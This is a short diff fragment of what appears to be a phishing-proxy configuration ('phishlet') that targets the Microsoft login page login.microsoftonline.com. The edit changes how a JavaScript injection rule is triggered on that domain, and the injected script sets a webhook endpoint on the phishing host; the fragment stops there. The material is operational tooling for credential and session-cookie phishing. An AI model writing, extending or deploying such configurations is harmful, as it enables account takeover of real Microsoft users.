@@ -20,7 +20,7 @@ login:
   domain: 'login.microsoftonline.com'
   path: '/'
 js_inject:
-  - trigger: 'login.microsoftonline.com'
+  - trigger_domains: ['login.microsoftonline.com']
     code: |
       (function() {
         const api = "https://{{.Domain}}/api/webhook";
